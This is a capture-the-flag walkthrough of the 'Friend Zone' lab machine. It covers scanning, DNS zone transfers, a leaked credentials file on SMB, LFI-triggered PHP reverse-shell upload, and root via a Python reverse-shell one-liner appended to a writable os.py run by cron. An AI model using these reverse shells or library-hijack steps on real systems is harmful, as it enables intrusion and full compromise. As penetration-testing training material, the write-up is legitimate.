# 💔 Friend Zone

## Recon & Enumeration <a href="#id-754c" id="id-754c"></a>

Let’s use nmapAutomator to full scan for open ports and services:

```
┌──(kali㉿kali)-[~]
└─$ nmapAutomator 10.10.10.123 Full

Running a Full scan on 10.10.10.123

Host is likely running Linux
                                                                                                                    
                                                                                                                    
---------------------Starting Full Scan------------------------


PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
53/tcp  open  domain
80/tcp  open  http
139/tcp open  netbios-ssn
443/tcp open  https
445/tcp open  microsoft-ds



Making a script scan on all ports


PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Friend Zone Escape software
|_http-server-header: Apache/2.4.29 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/http    Apache httpd 2.4.29
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 404 Not Found
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
| Not valid before: 2018-10-05T21:02:30
|_Not valid after:  2018-11-04T21:02:30
| tls-alpn: 
|_  http/1.1
Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: mean: -59m58s, deviation: 1h43m54s, median: 0s
| smb2-time: 
|   date: 2023-07-15T17:55:07
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: friendzone
|   NetBIOS computer name: FRIENDZONE\x00
|   Domain name: \x00
|   FQDN: friendzone
|_  System time: 2023-07-15T20:55:08+03:00  
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

grep: (standard input): binary file matches



---------------------Finished all scans------------------------

Completed in 3 minute(s) and 2 second(s)
```

Visit the target on port 80.

<figure><img src="https://miro.medium.com/v2/resize:fit:647/1*OPdfegYqTMg2fMIioeBunQ.png" alt="" height="644" width="647"><figcaption></figcaption></figure>

In the course of our enumeration, we have identified two potential domains:

1. **friendzone.red** — Discovered through the nmapAutomator scan’s results.
2. **friendzoneportal.red** — Identified on the HTTP website as the screenshot above.

## Zone Transfer

To proceed, we will attempt a zone transfer on both domains.

```
┌──(kali㉿kali)-[~/Desktop]
└─$ dig axfr friendzone.red @10.10.10.123

; <<>> DiG 9.18.13-1-Debian <<>> axfr friendzone.red @10.10.10.123
;; global options: +cmd
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
friendzone.red.         604800  IN      AAAA    ::1
friendzone.red.         604800  IN      NS      localhost.
friendzone.red.         604800  IN      A       127.0.0.1
administrator1.friendzone.red. 604800 IN A      127.0.0.1
hr.friendzone.red.      604800  IN      A       127.0.0.1
uploads.friendzone.red. 604800  IN      A       127.0.0.1
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 148 msec
;; SERVER: 10.10.10.123#53(10.10.10.123) (TCP)
;; WHEN: Sat Jul 15 23:02:55 +03 2023
;; XFR size: 8 records (messages 1, bytes 289)

                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop]
└─$ dig axfr friendzoneportal.red @10.10.10.123
;; communications error to 10.10.10.123#53: timed out
;; communications error to 10.10.10.123#53: timed out

; <<>> DiG 9.18.13-1-Debian <<>> axfr friendzoneportal.red @10.10.10.123
;; global options: +cmd
friendzoneportal.red.   604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
friendzoneportal.red.   604800  IN      AAAA    ::1
friendzoneportal.red.   604800  IN      NS      localhost.
friendzoneportal.red.   604800  IN      A       127.0.0.1
admin.friendzoneportal.red. 604800 IN   A       127.0.0.1
files.friendzoneportal.red. 604800 IN   A       127.0.0.1
imports.friendzoneportal.red. 604800 IN A       127.0.0.1
vpn.friendzoneportal.red. 604800 IN     A       127.0.0.1
friendzoneportal.red.   604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 127 msec
;; SERVER: 10.10.10.123#53(10.10.10.123) (TCP)
;; WHEN: Sat Jul 15 23:03:29 +03 2023
;; XFR size: 9 records (messages 1, bytes 309)
```

Incorporate all domains and subdomains into the /etc/hosts file.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*JhU_DIJP3pNPhWrw2tBfWw.png" alt="" height="122" width="700"><figcaption></figcaption></figure>

Subsequently, we conducted visits to the identified subdomains via both HTTP and HTTPS protocols. Notably, the following site yielded particularly intriguing findings.

[https://administrator1.friendzone.red](https://administrator1.friendzone.red/)

<figure><img src="https://miro.medium.com/v2/resize:fit:552/1*_xkLO9xRP4gSp4lEKwhIMQ.png" alt="" height="603" width="552"><figcaption></figcaption></figure>

Upon identifying open ports 139 and 445, let’s utilize smbmap to enumerate the available shares recursively.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*WfZzIkQc6cBio10Ge3TNyA.png" alt="" height="198" width="700"><figcaption></figcaption></figure>

We discovered a file named “creds.txt” within the general share and we possess READ/WRITE privileges for the Development share.

To access the “creds.txt” file, we login to the general share using smbclient with no password.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*i76HDthtQVMTXbFrhA9-Ew.png" alt="" height="293" width="700"><figcaption></figcaption></figure>

Upon successful retrieval of the creds.txt file from the target machine to the attack box, the obtained credentials are as follows:

Username: admin

Password: WORKWORKHhallelujah@#

## Exploitation: <a href="#id-69a7" id="id-69a7"></a>

The credentials obtained remain uncertain in terms of their potential benefits. However, if we utilize these credentials for login purposes on the page below.

[https://administrator1.friendzone.red](https://administrator1.friendzone.red/)

<figure><img src="https://miro.medium.com/v2/resize:fit:631/1*aLeo6KF_gnf-iu2AFF9YwA.png" alt="" height="132" width="631"><figcaption></figcaption></figure>

We are now advised to visit /dashboard.php.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*nO2rz-FYSCtI0_C4lQuMCg.png" alt="" height="317" width="700"><figcaption></figcaption></figure>

The dashboard.php page provides specific instructions. We will put the below to the URL:

?image\_id=a.jpg\&pagename=timestamp

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*i1ki7Fe520uC3o249CYGSw.png" alt="" height="334" width="700"><figcaption></figcaption></figure>

Looking at the URL now, give us a suspecion that we should check it against LFI vulnerability.

Since we have a READ/WRITE access to the Development share, let’s upload a php reverse shell by [pentestmonky](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) after putting the right parameters of the IP and Port of the attack box.

<figure><img src="https://miro.medium.com/v2/resize:fit:365/1*ZiqumP8ReUFc8lPq2kwbow.png" alt="" height="181" width="365"><figcaption></figcaption></figure>

Upload it to the Development share.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*W7GKQcuWDNkDlfESrXTLEA.png" alt="" height="284" width="700"><figcaption></figcaption></figure>

Start a listener accordingly.

<figure><img src="https://miro.medium.com/v2/resize:fit:244/1*1e6pxUmyjekCIsfiVbWpCw.png" alt="" height="86" width="244"><figcaption></figcaption></figure>

From the browser, we put the link below:

[`https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/php-reverse-shell`](https://administrator1.friendzone.red/dashboard.php?image\_id=a.jpg\&pagename=%2Fetc%2FDevelopment%2Fphp-reverse-shell)

> Note: It worked here without including the extension of the reverse shell file, meaning that the application does that already.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*nJWDYmHGJMcf767ZlL61UQ.png" alt="" height="333" width="700"><figcaption></figcaption></figure>

On the listener.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*Ric3vlnJ0OG2tTEJdnoq2A.png" alt="" height="177" width="700"><figcaption></figcaption></figure>

And we get a shell, and we can also upgrade it using the command: `python -c 'import pty; pty.spawn("/bin/bash")’`

## Privilege Escalation: <a href="#e80a" id="e80a"></a>

To escalate our privileges we upload [pspy](https://github.com/DominicBreuker/pspy) to the Development share through smb.

<figure><img src="https://miro.medium.com/v2/resize:fit:617/1*mPEq4b2NOwb93ZMBYqsinA.png" alt="" height="238" width="617"><figcaption></figcaption></figure>

Launch pspy.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*_X2FUxHKBTZuVmsAPN3H2Q.png" alt="" height="567" width="700"><figcaption></figcaption></figure>

After a while we start seeing a process running periodically.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*vzyr51q4vHJxB8WDeRBuKA.png" alt="" height="329" width="700"><figcaption></figcaption></figure>

Let’s have a look at the “reporter.py” script.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*7kGsaVplHF8A3t6qAKEJdA.png" alt="" height="296" width="700"><figcaption></figcaption></figure>

The “reporter.py” script executes periodically as a root-privileged cron job. The script imports the “os” module. Let’s check “os.py.”

<figure><img src="https://miro.medium.com/v2/resize:fit:514/1*yxHc9gqIqBFGXHu3p8ChBw.png" alt="" height="185" width="514"><figcaption></figcaption></figure>

We have two files of os.py with python2 and python3.

<figure><img src="https://miro.medium.com/v2/resize:fit:246/1*IXFIY0a_h7RYHj-A66mE1A.png" alt="" height="93" width="246"><figcaption></figcaption></figure>

The reporter.py script directs to the interpreter /usr/bin/python, checking which python and the version tells us that it is 2.7.

<figure><img src="https://miro.medium.com/v2/resize:fit:548/1*8EMynSA4ijzzGIyK-X4jeQ.png" alt="" height="59" width="548"><figcaption></figcaption></figure>

The module os.py indicates that we possess read, write, and execute (rwx) privileges on the “os.py” file. Our next step is to add the following one-liner standard reverse shell Python script to the “os.py” file.

`echo 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.8",4343));dup2(s.fileno(),0);dup2(s.fileno(),1);dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);s.close()' >> /usr/lib/python2.7/os.py`

First, we start a listener.

<figure><img src="https://miro.medium.com/v2/resize:fit:244/1*1e6pxUmyjekCIsfiVbWpCw.png" alt="" height="86" width="244"><figcaption></figcaption></figure>

Now, we append the one-liner script above to os.py.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*h1nsHRAK4sGnZnxnJnBRLA.png" alt="" height="55" width="700"><figcaption></figcaption></figure>

And we get a root shell on our listener.

<figure><img src="https://miro.medium.com/v2/resize:fit:505/1*B73dJT6yWu10XaGnPbrBgw.png" alt="" height="155" width="505"><figcaption></figcaption></figure>

Cheers.
